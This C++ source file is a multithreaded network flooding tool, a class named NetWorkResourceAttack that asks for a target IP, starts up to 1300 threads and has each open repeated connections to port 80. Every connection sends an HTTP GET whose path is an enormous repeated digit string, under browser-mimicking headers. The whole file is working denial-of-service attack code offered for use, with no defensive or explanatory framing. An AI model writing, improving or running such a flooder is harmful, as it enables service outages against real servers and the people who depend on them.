//
// Created by ubuntu on 24-2-17.
//

#include "config.h"
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>
#include "EasyLib.cpp"

using namespace std;

class NetWorkResourceAttack {
private:
    std::string target;
    int number = 0;
    bool isAlways = false;
    int thread = 0;
    bool isBackup = false;
    int attack_number = 0;
public:
    NetWorkResourceAttack() = default;
    void run_threads(int thread) {
        std::vector<std::thread> threads;
        for (int i = 0; i < thread; i++) {
            threads.emplace_back([this, i] { attack(i); });
        }
        for (auto& thread : threads) {
            thread.join();
        }
    }

    void attack(int i) {
        stringstream ss;
        for (int a = 0 ; a < INT16_MAX ; a++) {
            ss << "/128318239012890312803128093812903812903812908129038109812903812938120938120938120938129038209183012983901283290";
        }
        for (int j = 0 ; j < number ; j++) {
            try {
                int sockfd = socket(AF_INET, SOCK_STREAM, 0);
                if (sockfd < 0) {
                    perror("socket failed");
                    return;
                }
                struct sockaddr_in server_addr{};
                server_addr.sin_family = AF_INET;
                server_addr.sin_port = htons(80);
                inet_pton(AF_INET, target.c_str(), &server_addr.sin_addr);
                if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                    perror("connect failed");
                    return;
                }
                const string a = "GET " + ss.str() + " HTTP/1.1\n"
                                                     "Host: www.baidu.com\n"
                                                     "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0\n"
                                                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n"
                                                     "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n"
                                                     "Accept-Encoding: gzip, deflate, br\n"
                                                     "Connection: keep-alive\n"
                                                     "Sec-Fetch-Dest: document\n"
                                                     "Sec-Fetch-Mode: navigate\n"
                                                     "Sec-Fetch-Site: none\n"
                                                     "Sec-Fetch-User: ?1";
                const char* hello = a.c_str();
                send(sockfd, hello, strlen(hello), 0);
                attack_number += 1;
                if (number > 100 && attack_number % 10000 == 0) {
                    std::cout << "[ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << std::endl;
                }
                if (number < 100){
                    std::cout << "[ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << std::endl;
                }
                close(sockfd);
            }catch (const std::exception& e) {
                if (e.what() == "socket failed: Too many open files") {
                    continue;
                }
            }
        }
    }

    void Console() {

        target = input("Input Your Attack Target: ");
        string n = input(
                "Enter the amount of data for a single user attack: "
        );
        if (n == "max") {
            isAlways = true;
        }else {
            try {
                number = stoi(n);
            }catch (const runtime_error& error) {
                std::cout << "[ERR] Your Input Error." << std::endl;
                return;
            }
        }
        try {
            thread = stoi(input("Input all the attack user number: [1-1300] "));
            if (thread > 1300 || thread < 1)
            {
                std::cerr << "Your Input Error. Break the options.";
                return;
            }
        }catch (const runtime_error& error)
        {
            std::cout << "[ERR] Your Input Error." << std::endl;
            return;
        }
        try {
            cout << "\n------------------------------------" << endl;
            run_threads(thread);
        }catch (const runtime_error& error) {
            std::cout << "[ERR] runtime Error." << std::endl;
            return;
        }
        cout << "Finish Attack" << endl;
    }
};
